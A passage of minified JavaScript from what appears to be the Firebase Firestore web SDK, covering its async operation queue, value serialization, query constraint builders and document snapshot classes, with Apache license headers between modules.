r=e._path.child(Ar.fromString(t,...n));return kl(r),new Rl(e.firestore,e instanceof Pl?e.converter:null,new Or(r))
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class Ul{constructor(){this.Nc=Promise.resolve(),this.kc=[],this.Oc=!1,this.$c=[],this.Mc=null,this.Fc=!1,this.Bc=!1,this.Lc=[],this.Co=new no(this,"async_queue_retry"),this.qc=()=>{let e=eo();e&&sr("AsyncQueue","Visibility state changed to "+e.visibilityState),this.Co.vo()};let e=eo();e&&"function"==typeof e.addEventListener&&e.addEventListener("visibilitychange",this.qc)}get isShuttingDown(){return this.Oc}enqueueAndForget(e){this.enqueue(e)}enqueueAndForgetEvenWhileRestricted(e){this.Uc(),this.Kc(e)}enterRestrictedMode(e){if(!this.Oc){this.Oc=!0,this.Bc=e||!1;let t=eo();t&&"function"==typeof t.removeEventListener&&t.removeEventListener("visibilitychange",this.qc)}}enqueue(e){if(this.Uc(),this.Oc)return new Promise((()=>{}));let t=new dr;return this.Kc((()=>this.Oc&&this.Bc?Promise.resolve():(e().then(t.resolve,t.reject),t.promise))).then((()=>t.promise))}enqueueRetryable(e){this.enqueueAndForget((()=>(this.kc.push(e),this.Gc())))}async Gc(){if(0!==this.kc.length){try{await this.kc[0](),this.kc.shift(),this.Co.reset()}catch(e){if(!Pr(e))throw e;sr("AsyncQueue","Operation failed with retryable error: "+e)}this.kc.length>0&&this.Co.Ao((()=>this.Gc()))}}Kc(e){let t=this.Nc.then((()=>(this.Fc=!0,e().catch((e=>{let t;throw this.Mc=e,this.Fc=!1,ar("INTERNAL UNHANDLED ERROR: ",(t=e.message||"",e.stack&&(t=e.stack.includes(e.message)?e.stack:e.message+"\n"+e.stack),t)),e})).then((e=>(this.Fc=!1,e))))));return this.Nc=t,t}enqueueAfterDelay(e,t,n){this.Uc(),this.Lc.indexOf(e)>-1&&(t=0);let r=Po.createAndSchedule(this,e,t,n,(e=>this.Qc(e)));return this.$c.push(r),r}Uc(){this.Mc&&ur()}verifyOperationInProgress(){}async zc(){let e;do{e=this.Nc,await e}while(e!==this.Nc)}jc(e){for(let t of this.$c)if(t.timerId===e)return!0;return!1}Wc(e){return this.zc().then((()=>{for(let t of(this.$c.sort(((e,t)=>e.targetTimeMs-t.targetTimeMs)),this.$c))if(t.skipDelay(),"all"!==e&&t.timerId===e)break;return this.zc()}))}Hc(e){this.Lc.push(e)}Qc(e){let t=this.$c.indexOf(e);this.$c.splice(t,1)}}function Vl(e){return function(e,t){if("object"!=typeof e||null===e)return!1;for(let t of["next","error","complete"])if(t in e&&"function"==typeof e[t])return!0;return!1}(e)}class jl extends Dl{constructor(e,t,n,r){super(e,t,n,r),this.type="firestore",this._queue=new Ul,this._persistenceKey=(null==r?void 0:r.name)||"[DEFAULT]"}_terminate(){return this._firestoreClient||$l(this),this._firestoreClient.terminate()}}function Bl(e,t){let n="object"==typeof e?e:(0,c.Mq)(),r=(0,c.qX)(n,"firestore").getImmediate({identifier:"string"==typeof e?e:t||"(default)"});if(!r._initialized){let e=(0,f.P0)("firestore");e&&function(e,t,n,r={}){var i;let s=(e=Nl(e,Dl))._getSettings();if("firestore.googleapis.com"!==s.host&&s.host!==t&&or("Host has been set in both settings() and useEmulator(), emulator host will be used"),e._setSettings(Object.assign(Object.assign({},s),{host:`${t}:${n}`,ssl:!1})),r.mockUserToken){let t,n;if("string"==typeof r.mockUserToken)t=r.mockUserToken,n=tr.MOCK_USER;else{t=(0,f.Sg)(r.mockUserToken,null===(i=e._app)||void 0===i?void 0:i.options.projectId);let s=r.mockUserToken.sub||r.mockUserToken.user_id;if(!s)throw new hr(cr.INVALID_ARGUMENT,"mockUserToken must contain 'sub' or 'user_id' field!");n=new tr(s)}e._authCredentials=new mr(new fr(t,n))}}(r,...e)}return r}function ql(e){return e._firestoreClient||$l(e),e._firestoreClient.verifyNotTerminated(),e._firestoreClient}function $l(e){var t,n,r,i,s,a;let o=e._freezeSettings(),l=(i=e._databaseId,s=(null===(t=e._app)||void 0===t?void 0:t.options.appId)||"",a=e._persistenceKey,new ei(i,s,a,o.host,o.ssl,o.experimentalForceLongPolling,o.experimentalAutoDetectLongPolling,o.useFetchStreams));e._firestoreClient=new wl(e._authCredentials,e._appCheckCredentials,e._queue,l),(null===(n=o.cache)||void 0===n?void 0:n._offlineComponentProvider)&&(null===(r=o.cache)||void 0===r?void 0:r._onlineComponentProvider)&&(e._firestoreClient._uninitializedComponentsProvider={_offlineKind:o.cache.kind,_offline:o.cache._offlineComponentProvider,_online:o.cache._onlineComponentProvider})}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class zl{constructor(e){this._byteString=e}static fromBase64String(e){try{return new zl(Hr.fromBase64String(e))}catch(e){throw new hr(cr.INVALID_ARGUMENT,"Failed to construct data from Base64 string: "+e)}}static fromUint8Array(e){return new zl(Hr.fromUint8Array(e))}toBase64(){return this._byteString.toBase64()}toUint8Array(){return this._byteString.toUint8Array()}toString(){return"Bytes(base64: "+this.toBase64()+")"}isEqual(e){return this._byteString.isEqual(e._byteString)}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Gl{constructor(...e){for(let t=0;t<e.length;++t)if(0===e[t].length)throw new hr(cr.INVALID_ARGUMENT,"Invalid field name at argument $(i + 1). Field names must not be empty.");this._internalPath=new Nr(e)}isEqual(e){return this._internalPath.isEqual(e._internalPath)}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Kl{constructor(e){this._methodName=e}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Hl{constructor(e,t){if(!isFinite(e)||e<-90||e>90)throw new hr(cr.INVALID_ARGUMENT,"Latitude must be a number between -90 and 90, but was: "+e);if(!isFinite(t)||t<-180||t>180)throw new hr(cr.INVALID_ARGUMENT,"Longitude must be a number between -180 and 180, but was: "+t);this._lat=e,this._long=t}get latitude(){return this._lat}get longitude(){return this._long}isEqual(e){return this._lat===e._lat&&this._long===e._long}toJSON(){return{latitude:this._lat,longitude:this._long}}_compareTo(e){return Ir(this._lat,e._lat)||Ir(this._long,e._long)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Wl=/^__.*__$/;class Ql{constructor(e,t,n){this.data=e,this.fieldMask=t,this.fieldTransforms=n}toMutation(e,t){return null!==this.fieldMask?new Ds(e,this.data,this.fieldMask,t,this.fieldTransforms):new Os(e,this.data,t,this.fieldTransforms)}}class Jl{constructor(e,t,n){this.data=e,this.fieldMask=t,this.fieldTransforms=n}toMutation(e,t){return new Ds(e,this.data,this.fieldMask,t,this.fieldTransforms)}}function Xl(e){switch(e){case 0:case 2:case 1:return!0;case 3:case 4:return!1;default:throw ur()}}class Yl{constructor(e,t,n,r,i,s){this.settings=e,this.databaseId=t,this.serializer=n,this.ignoreUndefinedProperties=r,void 0===i&&this.Jc(),this.fieldTransforms=i||[],this.fieldMask=s||[]}get path(){return this.settings.path}get Yc(){return this.settings.Yc}Zc(e){return new Yl(Object.assign(Object.assign({},this.settings),e),this.databaseId,this.serializer,this.ignoreUndefinedProperties,this.fieldTransforms,this.fieldMask)}Xc(e){var t;let n=null===(t=this.path)||void 0===t?void 0:t.child(e),r=this.Zc({path:n,ta:!1});return r.ea(e),r}na(e){var t;let n=null===(t=this.path)||void 0===t?void 0:t.child(e),r=this.Zc({path:n,ta:!1});return r.Jc(),r}sa(e){return this.Zc({path:void 0,ta:!0})}ia(e){return cu(e,this.settings.methodName,this.settings.ra||!1,this.path,this.settings.oa)}contains(e){return void 0!==this.fieldMask.find((t=>e.isPrefixOf(t)))||void 0!==this.fieldTransforms.find((t=>e.isPrefixOf(t.field)))}Jc(){if(this.path)for(let e=0;e<this.path.length;e++)this.ea(this.path.get(e))}ea(e){if(0===e.length)throw this.ia("Document fields must not be empty");if(Xl(this.Yc)&&Wl.test(e))throw this.ia('Document fields cannot begin and end with "__"')}}class Zl{constructor(e,t,n){this.databaseId=e,this.ignoreUndefinedProperties=t,this.serializer=n||to(e)}ua(e,t,n,r=!1){return new Yl({Yc:e,methodName:t,oa:n,path:Nr.emptyPath(),ta:!1,ra:r},this.databaseId,this.serializer,this.ignoreUndefinedProperties)}}function eu(e){let t=e._freezeSettings(),n=to(e._databaseId);return new Zl(e._databaseId,!!t.ignoreUndefinedProperties,n)}class tu extends Kl{_toFieldTransform(e){if(2!==e.Yc)throw 1===e.Yc?e.ia(`${this._methodName}() can only appear at the top level of your update data`):e.ia(`${this._methodName}() cannot be used with set() unless you pass {merge:true}`);return e.fieldMask.push(e.path),null}isEqual(e){return e instanceof tu}}function nu(e,t,n,r=!1){return ru(n,e.ua(r?4:3,t))}function ru(e,t){if(su(e=(0,f.m9)(e)))return au("Unsupported field value:",t,e),iu(e,t);if(e instanceof Kl)return function(e,t){if(!Xl(t.Yc))throw t.ia(`${e._methodName}() can only be used with update() and set()`);if(!t.path)throw t.ia(`${e._methodName}() is not currently supported inside arrays`);let n=e._toFieldTransform(t);n&&t.fieldTransforms.push(n)}(e,t),null;if(void 0===e&&t.ignoreUndefinedProperties)return null;if(t.path&&t.fieldMask.push(t.path),e instanceof Array){if(t.settings.ta&&4!==t.Yc)throw t.ia("Nested arrays are not supported");return function(e,t){let n=[],r=0;for(let i of e){let e=ru(i,t.sa(r));null==e&&(e={nullValue:"NULL_VALUE"}),n.push(e),r++}return{arrayValue:{values:n}}}(e,t)}return function(e,t){if(null===(e=(0,f.m9)(e)))return{nullValue:"NULL_VALUE"};var n,r,i;if("number"==typeof e)return n=t.serializer,"number"==typeof(i=r=e)&&Number.isInteger(i)&&!Mr(i)&&i<=Number.MAX_SAFE_INTEGER&&i>=Number.MIN_SAFE_INTEGER?ds(r):hs(n,r);if("boolean"==typeof e)return{booleanValue:e};if("string"==typeof e)return{stringValue:e};if(e instanceof Date){let n=Tr.fromDate(e);return{timestampValue:ra(t.serializer,n)}}if(e instanceof Tr){let n=new Tr(e.seconds,1e3*Math.floor(e.nanoseconds/1e3));return{timestampValue:ra(t.serializer,n)}}if(e instanceof Hl)return{geoPointValue:{latitude:e.latitude,longitude:e.longitude}};if(e instanceof zl)return{bytesValue:ia(t.serializer,e._byteString)};if(e instanceof Rl){let n=t.databaseId,r=e.firestore._databaseId;if(!r.isEqual(n))throw t.ia(`Document reference is for database ${r.projectId}/${r.database} but should be for database ${n.projectId}/${n.database}`);return{referenceValue:aa(e.firestore._databaseId||t.databaseId,e._key.path)}}throw t.ia(`Unsupported field value: ${Cl(e)}`)}(e,t)}function iu(e,t){let n={};return Vr(e)?t.path&&t.path.length>0&&t.fieldMask.push(t.path):Ur(e,((e,r)=>{let i=ru(r,t.Xc(e));null!=i&&(n[e]=i)})),{mapValue:{fields:n}}}function su(e){return!("object"!=typeof e||null===e||e instanceof Array||e instanceof Date||e instanceof Tr||e instanceof Hl||e instanceof zl||e instanceof Rl||e instanceof Kl)}function au(e,t,n){if(!su(n)||"object"!=typeof n||null===n||Object.getPrototypeOf(n)!==Object.prototype&&null!==Object.getPrototypeOf(n)){let r=Cl(n);throw"an object"===r?t.ia(e+" a custom object"):t.ia(e+" "+r)}}function ou(e,t,n){if((t=(0,f.m9)(t))instanceof Gl)return t._internalPath;if("string"==typeof t)return uu(e,t);throw cu("Field path arguments must be of type string or ",e,!1,void 0,n)}let lu=RegExp("[~\\*/\\[\\]]");function uu(e,t,n){if(t.search(lu)>=0)throw cu(`Invalid field path (${t}). Paths must not contain '~', '*', '/', '[', or ']'`,e,!1,void 0,n);try{return new Gl(...t.split("."))._internalPath}catch(r){throw cu(`Invalid field path (${t}). Paths must not be empty, begin with '.', end with '.', or contain '..'`,e,!1,void 0,n)}}function cu(e,t,n,r,i){let s=r&&!r.isEmpty(),a=void 0!==i,o=`Function ${t}() called with invalid data`;n&&(o+=" (via `toFirestore()`)"),o+=". ";let l="";return(s||a)&&(l+=" (found",s&&(l+=` in field ${r}`),a&&(l+=` in document ${i}`),l+=")"),new hr(cr.INVALID_ARGUMENT,o+e+l)}function hu(e,t){return e.some((e=>e.isEqual(t)))}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class du{constructor(e,t,n,r,i){this._firestore=e,this._userDataWriter=t,this._key=n,this._document=r,this._converter=i}get id(){return this._key.path.lastSegment()}get ref(){return new Rl(this._firestore,this._converter,this._key)}exists(){return null!==this._document}data(){if(this._document){if(this._converter){let e=new fu(this._firestore,this._userDataWriter,this._key,this._document,null);return this._converter.fromFirestore(e)}return this._userDataWriter.convertValue(this._document.data.value)}}get(e){if(this._document){let t=this._document.data.field(pu("DocumentSnapshot.get",e));if(null!==t)return this._userDataWriter.convertValue(t)}}}class fu extends du{data(){return super.data()}}function pu(e,t){return"string"==typeof t?uu(e,t):t instanceof Gl?t._internalPath:t._delegate._internalPath}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function mu(e){if("L"===e.limitType&&0===e.explicitOrderBy.length)throw new hr(cr.UNIMPLEMENTED,"limitToLast() queries require specifying at least one orderBy() clause")}class gu{}class yu extends gu{}function vu(e,t,...n){let r=[];for(let i of(t instanceof gu&&r.push(t),function(e){let t=e.filter((e=>e instanceof _u)).length,n=e.filter((e=>e instanceof wu)).length;if(t>1||t>0&&n>0)throw new hr(cr.INVALID_ARGUMENT,"InvalidQuery. When using composite filters, you cannot use more than one filter at the top level. Consider nesting the multiple filters within an `and(...)` statement. For example: change `query(query, where(...), or(...))` to `query(query, and(where(...), or(...)))`.")}(r=r.concat(n)),r))e=i._apply(e);return e}class wu extends yu{constructor(e,t,n){super(),this._field=e,this._op=t,this._value=n,this.type="where"}static _create(e,t,n){return new wu(e,t,n)}_apply(e){let t=this._parse(e);return Lu(e._query,t),new xl(e.firestore,e.converter,Wi(e._query,t))}_parse(e){let t=eu(e.firestore);return function(e,t,n,r,i,s,a){let o;if(i.isKeyField()){if("array-contains"===s||"array-contains-any"===s)throw new hr(cr.INVALID_ARGUMENT,`Invalid Query. You can't perform '${s}' queries on documentId().`);if("in"===s||"not-in"===s){Pu(a,s);let t=[];for(let n of a)t.push(xu(r,e,n));o={arrayValue:{values:t}}}else o=xu(r,e,a)}else"in"!==s&&"not-in"!==s&&"array-contains-any"!==s||Pu(a,s),o=nu(n,"where",a,"in"===s||"not-in"===s);return Ti.create(i,s,o)}(e._query,0,t,e.firestore._databaseId,this._field,this._op,this._value)}}function bu(e,t,n){let r=pu("where",e);return wu._create(r,t,n)}class _u extends gu{constructor(e,t){super(),this.type=e,this._queryConstraints=t}static _create(e,t){return new _u(e,t)}_parse(e){let t=this._queryConstraints.map((t=>t._parse(e))).filter((e=>e.getFilters().length>0));return 1===t.length?t[0]:Si.create(t,this._getOperator())}_apply(e){let t=this._parse(e);return 0===t.getFilters().length?e:(function(e,t){let n=e,r=t.getFlattenedFilters();for(let e of r)Lu(n,e),n=Wi(n,e)}(e._query,t),new xl(e.firestore,e.converter,Wi(e._query,t)))}_getQueryConstraints(){return this._queryConstraints}_getOperator(){return"and"===this.type?"and":"or"}}class Iu extends yu{constructor(e,t){super(),this._field=e,this._direction=t,this.type="orderBy"}static _create(e,t){return new Iu(e,t)}_apply(e){let t=function(e,t,n){if(null!==e.startAt)throw new hr(cr.INVALID_ARGUMENT,"Invalid query. You must not call startAt() or startAfter() before calling orderBy().");if(null!==e.endAt)throw new hr(cr.INVALID_ARGUMENT,"Invalid query. You must not call endAt() or endBefore() before calling orderBy().");let r=new Ii(t,n);return function(e,t){if(null===$i(e)){let n=zi(e);null!==n&&Mu(e,n,t.field)}}(e,r),r}(e._query,this._field,this._direction);return new xl(e.firestore,e.converter,function(e,t){let n=e.explicitOrderBy.concat([t]);return new Bi(e.path,e.collectionGroup,n,e.filters.slice(),e.limit,e.limitType,e.startAt,e.endAt)}(e._query,t))}}function Eu(e,t="asc"){let n=pu("orderBy",e);return Iu._create(n,t)}class Tu extends yu{constructor(e,t,n){super(),this.type=e,this._limit=t,this._limitType=n}static _create(e,t,n){return new Tu(e,t,n)}_apply(e){return new xl(e.firestore,e.converter,Qi(e._query,this._limit,this._limitType))}}function Su(e){return function(e,t){if(t<=0)throw new hr(cr.INVALID_ARGUMENT,`Function limit() requires a positive number, but it was: ${t}.`)}(0,e),Tu._create("limit",e,"F")}class ku extends yu{constructor(e,t,n){super(),this.type=e,this._docOrFields=t,this._inclusive=n}static _create(e,t,n){return new ku(e,t,n)}_apply(e){var t;let n=Ru(e,this.type,this._docOrFields,this._inclusive);return new xl(e.firestore,e.converter,(t=e._query,new Bi(t.path,t.collectionGroup,t.explicitOrderBy.slice(),t.filters.slice(),t.limit,t.limitType,n,t.endAt)))}}function Au(...e){return ku._create("startAt",e,!0)}function Cu(...e){return ku._create("startAfter",e,!1)}class Nu extends yu{constructor(e,t,n){super(),this.type=e,this._docOrFields=t,this._inclusive=n}static _create(e,t,n){return new Nu(e,t,n)}_apply(e){var t;let n=Ru(e,this.type,this._docOrFields,this._inclusive);return new xl(e.firestore,e.converter,(t=e._query,new Bi(t.path,t.collectionGroup,t.explicitOrderBy.slice(),t.filters.slice(),t.limit,t.limitType,t.startAt,n)))}}function Ou(...e){return Nu._create("endBefore",e,!1)}function Du(...e){return Nu._create("endAt",e,!0)}function Ru(e,t,n,r){if(n[0]=(0,f.m9)(n[0]),n[0]instanceof du)return function(e,t,n,r,i){if(!r)throw new hr(cr.NOT_FOUND,`Can't use a DocumentSnapshot that doesn't exist for ${n}().`);let s=[];for(let n of Ki(e))if(n.field.isKeyField())s.push(ui(t,r.key));else{let e=r.data.field(n.field);if(Yr(e))throw new hr(cr.INVALID_ARGUMENT,'Invalid query. You are trying to start or end a query using a document for which the field "'+n.field+'" is an uncommitted server timestamp. (Since the value of this field is unknown, you cannot start/end a query with it.)');if(null===e){let e=n.field.canonicalString();throw new hr(cr.INVALID_ARGUMENT,`Invalid query. You are trying to start or end a query using a document for which the field '${e}' (used as the orderBy) does not exist.`)}s.push(e)}return new wi(s,i)}(e._query,e.firestore._databaseId,t,n[0]._document,r);{let i=eu(e.firestore);return function(e,t,n,r,i,s){let a=e.explicitOrderBy;if(i.length>a.length)throw new hr(cr.INVALID_ARGUMENT,`Too many arguments provided to ${r}(). The number of arguments must be less than or equal to the number of orderBy() clauses`);let o=[];for(let s=0;s<i.length;s++){let l=i[s];if(a[s].field.isKeyField()){if("string"!=typeof l)throw new hr(cr.INVALID_ARGUMENT,`Invalid query. Expected a string for document ID in ${r}(), but got a ${typeof l}`);if(!Gi(e)&&-1!==l.indexOf("/"))throw new hr(cr.INVALID_ARGUMENT,`Invalid query. When querying a collection and ordering by documentId(), the value passed to ${r}() must be a plain document ID, but '${l}' contains a slash.`);let n=e.path.child(Ar.fromString(l));if(!Or.isDocumentKey(n))throw new hr(cr.INVALID_ARGUMENT,`Invalid query. When querying a collection group and ordering by documentId(), the value passed to ${r}() must result in a valid document path, but '${n}' is not because it contains an odd number of segments.`);let i=new Or(n);o.push(ui(t,i))}else{let e=nu(n,r,l);o.push(e)}}return new wi(o,s)}(e._query,e.firestore._databaseId,i,t,n,r)}}function xu(e,t,n){if("string"==typeof(n=(0,f.m9)(n))){if(""===n)throw new hr(cr.INVALID_ARGUMENT,"Invalid query. When querying with documentId(), you must provide a valid document ID, but it was an empty string.");if(!Gi(t)&&-1!==n.indexOf("/"))throw new hr(cr.INVALID_ARGUMENT,`Invalid query. When querying a collection by documentId(), you must provide a plain document ID, but '${n}' contains a '/' character.`);let r=t.path.child(Ar.fromString(n));if(!Or.isDocumentKey(r))throw new hr(cr.INVALID_ARGUMENT,`Invalid query. When querying a collection group by documentId(), the value provided must result in a valid document path, but '${r}' is not because it has an odd number of segments (${r.length}).`);return ui(e,new Or(r))}if(n instanceof Rl)return ui(e,n._key);throw new hr(cr.INVALID_ARGUMENT,`Invalid query. When querying with documentId(), you must provide a valid string or a DocumentReference, but it was: ${Cl(n)}.`)}function Pu(e,t){if(!Array.isArray(e)||0===e.length)throw new hr(cr.INVALID_ARGUMENT,`Invalid Query. A non-empty array is required for '${t.toString()}' filters.`)}function Lu(e,t){if(t.isInequality()){let n=zi(e),r=t.field;if(null!==n&&!n.isEqual(r))throw new hr(cr.INVALID_ARGUMENT,`Invalid query. All where filters with an inequality (<, <=, !=, not-in, >, or >=) must be on the same field. But you have inequality filters on '${n.toString()}' and '${r.toString()}'`);let i=$i(e);null!==i&&Mu(e,r,i)}let n=function(e,t){for(let n of e)for(let e of n.getFlattenedFilters())if(t.indexOf(e.op)>=0)return e.op;return null}(e.filters,function(e){switch(e){case"!=":return["!=","not-in"];case"array-contains-any":case"in":return["not-in"];case"not-in":return["array-contains-any","in","not-in","!="];default:return[]}}(t.op));if(null!==n)throw n===t.op?new hr(cr.INVALID_ARGUMENT,`Invalid query. You cannot use more than one '${t.op.toString()}' filter.`):new hr(cr.INVALID_ARGUMENT,`Invalid query. You cannot use '${t.op.toString()}' filters with '${n.toString()}' filters.`)}function Mu(e,t,n){if(!n.isEqual(t))throw new hr(cr.INVALID_ARGUMENT,`Invalid query. You have a where filter with an inequality (<, <=, !=, not-in, >, or >=) on field '${t.toString()}' and so you must also use '${t.toString()}' as your first argument to orderBy(), but your first orderBy() is on field '${n.toString()}' instead.`)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Fu{constructor(e,t){this.hasPendingWrites=e,this.fromCache=t}isEqual(e){return this.hasPendingWrites===e.hasPendingWrites&&this.fromCache===e.fromCache}}class Uu extends du{constructor(e,t,n,r,i,s){super(e,t,n,r,s),this._firestore=e,this._firestoreImpl=e,this.metadata=i}exists(){return super.exists()}data(e={}){if(this._document){if(this._converter){let t=new Vu(this._firestore,this._userDataWriter,this._key,this._document,this.metadata,null);return this._converter.fromFirestore(t,e)}return this._userDataWriter.convertValue(this._document.data.value,e.serverTimestamps)}}get(e,t={}){if(this._document){let n=this._document.data.field(pu("DocumentSnapshot.get",e));if(null!==n)return this._userDataWriter.convertValue(n,t.serverTimestamps)}}}class Vu extends Uu{data(e={}){return super.data(e)}}class ju{constructor(e,t,n,r){this._firestore=e,this._userDataWriter=t,this._snapshot=r,this.metadata=new Fu(r.hasPendingWrites,r.fromCache),this.query=n}get docs(){let e=[];return this.forEach((t=>e.push(t))),e}get size(){return this._snapshot.docs.size}get empty(){return 0===this.size}forEach(e,t){this._snapshot.docs.forEach((n=>{e.call(t,new Vu(this._firestore,this._userDataWriter,n.key,n,new Fu(this._snapshot.mutatedKeys.has(n.key),this._snapshot.fromCache),this.query.converter))}))}docChanges(e={}){let t=!!e.includeMetadataChanges;if(t&&this._snapshot.excludesMetadataChanges)throw new hr(cr.INVALID_ARGUMENT,"To include metadata changes with your document changes, you must also pass { includeMetadataChanges:true } to onSnapshot().");return this._cachedChanges&&this._cachedChangesIncludeMetadataChanges===t||(this._cachedChanges=function(e,t){if(e._snapshot.oldDocs.isEmpty()){let t=0;return e._snapshot.docChanges.map((n=>{let r=new Vu(e._firestore,e._userDataWriter,n.doc.key,n.doc,new Fu(e._snapshot.mutatedKeys.has(n.doc.key),e._snapshot.fromCache),e.query.converter);return n.doc,{type:"added",doc:r,oldIndex:-1,newIndex:t++}}))}{let n=e._snapshot.oldDocs;return e._snapshot.docChanges.filter((e=>t||3!==e.type)).map((t=>{let r=new Vu(e._firestore,e._userDataWriter,t.doc.key,t.doc,new Fu(e._snapshot.mutatedKeys.has(t.doc.key),e._snapshot.fromCache),e.query.converter),i=-1,s=-1;return 0!==t.type&&(i=n.indexOf(t.doc.key),n=n.delete(t.doc.key)),1!==t.type&&(s=(n=n.add(t.doc)).indexOf(t.doc.key)),{type:function(e){switch(e){case 0:return"added";case 2:case 3:return"modified";case 1:return"removed";default:return ur()}}(t.type),doc:r,oldIndex:i,newIndex:s}}))}}(this,t),this._cachedChangesIncludeMetadataChanges=t),this._cachedChanges}}class Bu extends class{convertValue(e,t="none"){switch(ri(e)){case 0:return null;case 1:return e.booleanValue;case 2:return Jr(e.integerValue||e.doubleValue);case 3:return this.convertTimestamp(e.timestampValue);case 4:return this.convertServerTimestamp(e,t);case 5:return e.stringValue;case 6:return this.convertBytes(Xr(e.bytesValue));case 7:return this.convertReference(e.referenceValue);case 8:return this.convertGeoPoint(e.geoPointValue);case 9:return this.convertArray(e.arrayValue,t);case 10:return this.convertObject(e.mapValue,t);default:throw ur()}}convertObject(e,t){let n={};return Ur(e.fields,((e,r)=>{n[e]=this.convertValue(r,t)})),n}convertGeoPoint(e){return new Hl(Jr(e.latitude),Jr(e.longitude))}convertArray(e,t){return(e.values||[]).map((e=>this.convertValue(e,t)))}convertServerTimestamp(e,t){switch(t){case"previous":let n=function e(t){let n=t.mapValue.fields.__previous_value__;return Yr(n)?e(n):n}(e);return null==n?null:this.convertValue(n,t);case"estimate":return this.convertTimestamp(Zr(e));default:return null}}convertTimestamp(e){let t=Qr(e);return new Tr(t.seconds,t.nanos)}convertDocumentKey(e,t){let n=Ar.fromString(e);ga(n)||ur();let r=new ti(n.get(1),n.get(3)),i=new Or(n.popFirst(5));return r.isEqual(t)||ar(`Document ${i} contains a document reference within a different database (${r.projectId}/${r.database}) which is not supported. It will be treated as a reference in the current database (${t.projectId}/${t.database}) instead.`),i}}{constructor(e){super(),this.firestore=e}convertBytes(e){return new zl(e)}convertReference(e){let t=this.convertDocumentKey(e,this.firestore._databaseId);return new Rl(this.firestore,null,t)}}function qu(e){e=Nl(e,xl);let t=Nl(e.firestore,jl),n=ql(t),r=new Bu(t);return mu(e._query),function(e,t,n={}){let r=new dr;return e.asyncQueue.enqueueAndForget((async()=>function(e,t,n,r,i){let s=new vl({next:n=>{t.enqueueAndForget((()=>qo(e,a))),n.fromCache&&"server"===r.source?i.reject(new hr(cr.UNAVAILABLE,'Failed to get documents from server. (However, these documents may exist in the local cache. Run again without setting source to "server" to retrieve the cached documents.)')):i.resolve(n)},error:e=>i.reject(e)}),a=new Ko(n,s,{includeMetadataChanges:!0,xu:!0});return Bo(e,a)}(await El(e),e.asyncQueue,t,n,r))),r.promise}(n,e._query).then((n=>new ju(t,r,e,n)))}function $u(e){return Gu(Nl(e.firestore,jl),[new Ls(e._key,Ts.none())])}function 